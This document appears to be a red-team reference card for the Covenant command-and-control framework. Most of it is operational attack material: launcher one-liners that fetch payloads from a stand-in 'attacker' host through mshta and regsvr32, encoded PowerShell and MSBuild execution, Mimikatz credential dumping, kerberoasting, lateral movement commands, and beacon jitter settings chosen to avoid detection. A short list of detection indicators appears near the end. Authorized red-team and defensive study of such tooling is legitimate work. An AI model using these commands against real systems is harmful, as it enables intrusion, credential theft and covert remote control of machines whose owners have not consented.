# covenant Toolcard

## Overview
- Summary: Covenant is a .NET C2 framework for collaborative red team operations. ASP.NET Core web app with multi-user GUI on port 7443. Grunt implants are dynamically compiled with Roslyn and obfuscated with ConfuserEx per-build, achieving forward secrecy through encrypted key exchange. Supports HTTP, HTTPS, SMB, and TCP listeners with launcher types including PowerShell, MSBuild, InstallUtil, Mshta, Regsvr32, Cscript, and Wscript. MITRE ATT&CK T1071 (Application Layer Protocol), T1059.001 (PowerShell), T1059.009 (Cloud API).

## Advanced Techniques
- Install: `git clone --recurse-submodules https://github.com/cobbr/Covenant && cd Covenant/Covenant && dotnet run` — navigate to `https://127.0.0.1:7443`, register admin user.
- Docker: `docker build -t covenant .` → `docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /path/to/Data:/app/Data covenant`.
- Listener setup (GUI): Listeners → Create → set Name, BindAddress, BindPort, ConnectAddresses, HTTP Profile → Create.
- SMB listener for internal pivoting: no egress traffic, Grunts communicate through named pipes (T1090.001).
- Launcher generation (GUI): Launchers → select type → configure Listener → Generate → Host or Download.
- PowerShell launcher: `powershell -enc <base64>` (T1059.001) — MSBuild: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml` (T1127.001).
- InstallUtil: `InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll` (T1218.004) — Mshta: `mshta http://attacker/payload.hta` (T1218.005).
- Regsvr32: `regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll` (T1218.010).
- Grunt interaction (GUI): Grunts → click Grunt → Interact → type Task commands.
- Core tasks: `Shell whoami`, `Upload /local C:\remote`, `Download C:\file`, `Assembly /path/to/Seatbelt.exe` (T1620), `GetSystem` (T1134), `MakeToken DOMAIN\user pass` (T1134.001).
- Post-exploitation: `Mimikatz logonpasswords` (T1003), `Rubeus kerberoast` (T1558.003), `Seatbelt -group=all` (T1082), `SharpHound -c All` (T1087).
- Lateral movement: `WMICommand target command` (T1047), `PowerShellRemoting target command` (T1021.006).
- HTTP Profiles control request/response patterns (malleable C2) — set Delay/JitterPercent on Grunts to reduce beacon predictability.
- Detection indicators: .NET compilation artifacts, unusual MSBuild/InstallUtil/Regsvr32 execution, C# process injection patterns, named pipe communications on non-standard names.

## Safe Defaults
- Rate limits: configure Grunt Delay (≥30s) and JitterPercent (≥20%) to avoid predictable beaconing
- Scope rules: explicit target only — run elevated to bind low-numbered listener ports

## Evidence Outputs
- outputs: evidence.json, findings.json, task output logs, credential dumps (as applicable)

## References
- https://github.com/cobbr/Covenant
- https://github.com/cobbr/Covenant/wiki
